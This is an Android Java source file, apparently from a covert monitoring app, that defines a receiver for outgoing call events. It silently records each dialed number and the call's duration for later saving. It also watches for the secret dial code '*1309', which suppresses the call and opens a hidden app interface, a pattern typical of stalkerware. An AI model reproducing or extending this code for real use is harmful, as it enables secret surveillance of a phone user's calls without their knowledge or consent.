package com.xaviar.events;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.xaviar.collect.calllog.CallLogEntry;
import com.xaviar.collect.calllog_event.CalllogEventUtil;

public class OutgoingCallPhoneEventReceiver extends BroadcastReceiver {

	private static final String TAG = OutgoingCallPhoneEventReceiver.class.getSimpleName();
	
	private static CallLogEntry callLogEntry = null;

	private static String TYPE = "OUTGOING";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		handleRecive(context, intent);
	}

	private void handleRecive(Context context, Intent intent) {

		Bundle extras = intent.getExtras();
		if (null == extras)
			return;
		
		// avoid incomming phone event
		String incomminghPhoneNumber = extras.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
		if( null != incomminghPhoneNumber ) 
		{
		 // this is an incomming call - avoid  it!	
		 return;	
		}
		Log.d(TAG, "In BroadcastReciever out call handleRecive()");
		String state = extras.getString(TelephonyManager.EXTRA_STATE);
		handleState(context, state,intent);	
	}

	private void handleState(Context context, String state,Intent intent) {

		if (null == state) {
			String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
			if("*1309".equalsIgnoreCase(phoneNumber))
			{
				abortBroadcast();
				Intent i = new Intent();
				i.setClassName("com.xaviar.ui","com.xaviar.ui.MainActivity");
				i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(i);
			}
			callLogEntry = CalllogEventUtil.createStartCallData(phoneNumber,TYPE);				
		} else if (state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_RINGING)) {			
			return;
		} else if (state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_OFFHOOK)) {			
			return;
		} else if (state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_IDLE)) {
			if(null == callLogEntry) { return;}
			CalllogEventUtil.createEndCallData(callLogEntry);				
			CalllogEventUtil.save(context, callLogEntry);
		} 		
	}
}